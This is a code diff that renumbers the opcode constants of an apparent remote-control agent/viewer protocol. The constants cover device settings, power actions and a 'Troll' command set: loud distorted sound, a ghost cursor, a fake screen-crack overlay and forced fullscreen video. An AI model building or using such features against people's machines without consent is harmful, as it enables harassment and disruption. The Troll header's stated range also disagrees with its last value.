@@ -89,35 +89,36 @@ OP_CLIP_ENTRY   = 0x85  # Agent -> Viewer: new clipboard entry (real-time)
 OP_CLIP_DELETE  = 0x86  # Viewer -> Agent: delete entry by index
 
 # ============================================================================
-# Device Settings (0x84-0x8D)
+# Device Settings (0x88-0x91) - Rebased to avoid collision
 # ============================================================================
-OP_SET_WIFI       = 0x84  # {"enabled": bool}
-OP_SET_ETHERNET   = 0x85  # {"enabled": bool}
-OP_SET_VOLUME     = 0x86  # {"level": 0-100}
-OP_SET_MUTE       = 0x87  # {"muted": bool}
-OP_SET_TIME       = 0x88  # {"datetime": "ISO8601"}
-OP_SYNC_TIME      = 0x89  # sync to NTP
-OP_SET_BRIGHTNESS = 0x8A  # {"level": 0-100}
-OP_GET_SYSINFO    = 0x8B  # request system info
-OP_SYSINFO_DATA   = 0x8C  # JSON {os, cpu, ram, disk, battery, wifi_available}
-OP_POWER_ACTION   = 0x8D  # {"action": "sleep|restart|shutdown|lock|logoff"}
+OP_SET_WIFI       = 0x88  # {"enabled": bool}
+OP_SET_ETHERNET   = 0x89  # {"enabled": bool}
+OP_SET_VOLUME     = 0x8A  # {"level": 0-100}
+OP_SET_MUTE       = 0x8B  # {"muted": bool}
+OP_SET_TIME       = 0x8C  # {"datetime": "ISO8601"}
+OP_SYNC_TIME      = 0x8D  # sync to NTP
+OP_SET_BRIGHTNESS = 0x8E  # {"level": 0-100}
+OP_GET_SYSINFO    = 0x8F  # request system info
+OP_SYSINFO_DATA   = 0x90  # JSON {os, cpu, ram, disk, battery, wifi_available}
+OP_POWER_ACTION   = 0x91  # {"action": "sleep|restart|shutdown|lock|logoff"}
 
 # ============================================================================
-# Troll (0x90-0x9C)
+# Troll (0x98-0x9F, 0xA0-0xA3) - Rebased
+# REQUIRES ADMIN CONSENT & AUDIT LOGGING
 # ============================================================================
-OP_TROLL_URL          = 0x90  # {"url": "..."}
-OP_TROLL_SOUND        = 0x91  # audio bytes
-OP_TROLL_VIDEO        = 0x92  # video bytes (fullscreen)
-OP_TROLL_STOP         = 0x93  # stop current troll
-OP_TROLL_GHOST_CURSOR = 0x94  # {"enabled": bool}
-OP_TROLL_SHUFFLE_ICONS= 0x95  # shuffle desktop icons
-OP_TROLL_WALLPAPER    = 0x96  # image bytes
-OP_TROLL_OVERLAY      = 0x97  # {"type": "crack|hair"}
-OP_TROLL_RANDOM_SOUND = 0x98  # {"interval_ms": 5000}
-OP_TROLL_ALERT_LOOP   = 0x99  # {"enabled": bool}
-OP_TROLL_VOLUME_MAX   = 0x9A  # max volume + play sound
-OP_TROLL_EARRAPE      = 0x9B  # distorted loud sound
-OP_TROLL_WHISPER      = 0x9C  # {"enabled": bool}
+OP_TROLL_URL          = 0x98  # {"url": "..."}
+OP_TROLL_SOUND        = 0x99  # audio bytes
+OP_TROLL_VIDEO        = 0x9A  # video bytes (fullscreen)
+OP_TROLL_STOP         = 0x9B  # stop current troll
+OP_TROLL_GHOST_CURSOR = 0x9C  # {"enabled": bool}
+OP_TROLL_SHUFFLE_ICONS= 0x9D  # shuffle desktop icons
+OP_TROLL_WALLPAPER    = 0x9E  # image bytes
+OP_TROLL_OVERLAY      = 0x9F  # {"type": "crack|hair"}
+OP_TROLL_RANDOM_SOUND = 0xA0  # {"interval_ms": 5000}
+OP_TROLL_ALERT_LOOP   = 0xA1  # {"enabled": bool}
+OP_TROLL_VOLUME_MAX   = 0xA2  # max volume + play sound
+OP_TROLL_EARRAPE      = 0xA3  # distorted loud sound
+OP_TROLL_WHISPER      = 0xA4  # {"enabled": bool}
 
 # ============================================================================
 # System
